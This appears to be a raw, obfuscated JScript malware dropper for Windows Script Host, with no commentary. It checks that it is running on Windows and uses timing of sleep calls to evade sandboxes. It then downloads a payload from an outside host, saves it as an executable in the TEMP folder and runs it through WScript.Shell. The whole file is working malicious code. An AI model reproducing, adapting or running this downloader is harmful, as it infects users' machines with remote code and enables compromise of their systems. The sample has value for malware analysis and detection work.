var _YY = false;
var _XM = "CreateObject";
var _W0 = function _NU() {return WScript[_XM]("WScript"+".Shell");}(), _RX = 11;
var _U0 = "MSXML2.XMLHTTP";
var _LC = 2123213;
var _U = 0;
function _A(_C){_W0["Run"](_C, _U, _U);};
function _RO(){return _U0 + "";};
function _M(_JS, _R){_U = _U * 1; return _JS - _R;};
function _Z(){return _XM;};
/*@cc_on
  @if (@_win32 || @_win64)
    _YY = true;
  @end
@*/
if (_YY)
{
var _T = "";
function _V(){return 22;};
var _D = 0; var _ZI = 0;
function _Q()
{
var _VK = new this["Date"]();
var _K0 = _VK["getUTCMilliseconds"]();
WScript["Sleep"](_V());
var _VK = new this["Date"]();
var _VE = _VK["getUTCMilliseconds"]();
WScript["Sleep"](_V());
var _VK = new this["Date"]();
var _ON = _VK["getUTCMilliseconds"]();
var _D = "_L0";
_D = _M(_VE, _K0);
var _ZI = "_K";
_ZI = _M(_ON, _VE);
_T = "open";
return _M(_D, _ZI);
}
var _J0 = false;
var _YR = false;
for (var _J = _U; _J < _V() * 1; _J++){if (_Q() != _U){
_J0 = true; 
_ZI = "31" + 11 * _D + _ZI; 
_YR = true; 
break;
}}
function _SA() {return ((_J0 == true) && (_J0 == _YR)) ? 1 : _U;};
if (_J0 && _SA() && _YR){
function _N() {return _W0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "AdEySS9EdDj6.ex" + "e";};
 _L1 = _RO();
 _C0 = WScript[_XM](_L1);
 var _ZL = 1;
 while (_ZL){
try {
	if (_ZL == 1)
	{
		_C0[_T]("GET", "http://smartbs-cameroun.com/nc7sjd", false);
		_C0["send"]();
		_W = "Sleep";
	}
	WScript[_W](_V() + 120); 
	if (_C0["readystate"] < 2 * 2) continue;
	_ZL = _U;
	function _WE(_H) {var _Z0 = (1, 2, 3, 4, 5, _H); return _Z0;};
	_BQ = WScript[_Z()]("ADODB.Stream");
	_L1 = _BQ;
	_L1[_T]();
	_L1["type"] = _WE(1);
	_L1["write"](_C0["ResponseBody"]);
	_BQ["position"] = _WE(_U);
	_L1["Save" + "ToFile"](_N(), 2);
	_BQ["cl"+"ose"]();
	_L = _N();
	_A(_L);
} catch(_AH){};
}
}
}

